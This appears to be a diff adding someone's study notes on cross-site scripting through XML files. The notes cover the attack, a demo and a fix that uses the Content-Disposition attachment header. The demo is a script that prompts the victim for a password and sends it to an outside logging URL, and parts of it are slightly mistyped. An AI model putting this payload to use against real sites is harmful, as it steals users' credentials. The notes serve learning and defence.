@@ -1,0 +1,48 @@
+Overview:
+    -- Understanding XSS Attack
+    -- Understanding XSS via XML
+    -- Demo
+    -- Fixing the Problem
+
+
+
+::  Understanding XSS Attack  ::
+--  Tool(s)  --
+
+Executing scripts that get returned to the user.
+ED, getting cookies, etc.
+
+
+
+
+::  Understanding XSS via XML  ::  &&  ::  Demo  ::
+--  Tool(s)  --
+
+Making special script tag that gets run and sends entered password from user.
+
+<xhtml:html xmins:xhtml="http://www.w3.org/1999/xhtml1">
+<xhtml:script>
+    var pass = prompt("Enter your password to continue");
+    var xhr  = new XMLHttpRequest ();
+    xhr.open("GET", "https: //hacking-web-applications.com/log.php?pass="+
+                                                      encodeURI(pass) ) ;
+    xhr.send();
+</xhtml:script>
+</xhtml :html>
+
+
+
+
+::  Fixing the Problem  ::
+--  Tool(s)  --
+
+Make sure that the script included in the XML file is not executed
+     v
+Send the following response header:
+     Content-Disposition: attachment; filename="<yourfilename>"
+
+
+*** Tells the browser that it's not like an HTML file that needs to be processed.
+    Its an attachment file so should be downloaded.
+    Basically, it's like the parameterize argument in that the thing never gets
+    in a processing context.
